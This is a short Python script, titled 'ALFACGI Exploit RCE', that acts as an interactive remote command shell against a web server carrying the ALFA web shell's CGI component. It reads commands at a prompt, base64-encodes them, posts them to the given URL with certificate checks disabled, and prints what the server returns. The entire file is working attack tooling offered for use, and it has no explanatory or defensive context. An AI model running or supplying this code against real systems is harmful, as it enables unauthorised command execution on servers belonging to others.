import base64, requests,sys,readline
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
def encode64(string):
	b = string.encode('ascii')
	b64 = base64.b64encode(b)
	b64s = b64.decode('ascii')

	return b64s

def postShell(target, cmd):
	data = {
	'cmd': encode64(cmd)
	}
	r 	 = requests.post(target, data = data, verify=False)

	return r.text.replace('<pre>','').replace('</pre>','')

if len(sys.argv) < 2:
	print('''
 =====================
| ALFACGI Exploit RCE | @gtx666ti 
 =====================
Usage : {} http://target.com/ALFA_DATA/alfacgiapi/perl.alfa
		'''.format(sys.argv[0] ))
else:
	print('''
 =====================
| ALFACGI Exploit RCE | @gtx666ti 
 =====================
''')
	while 1:
		x = input('$ > ')
		print(postShell(sys.argv[1], x))